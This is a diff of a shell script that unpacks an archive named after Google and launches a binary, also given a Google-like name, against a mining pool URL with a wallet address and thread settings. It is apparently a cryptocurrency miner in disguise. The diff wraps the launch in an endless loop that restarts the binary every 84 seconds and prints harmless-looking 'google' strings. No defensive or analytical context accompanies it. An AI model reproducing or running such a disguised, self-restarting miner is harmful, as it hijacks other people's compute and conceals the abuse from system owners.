@@ -20,4 +20,14 @@ tar -xvf ./googleapps84741274.tar.gz
 
 cd googleapps8474
 
-./google84121274 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 8 -b 8
+while true
+do
+
+timeout 84 ./google84121274 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 8 -b 8
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+done
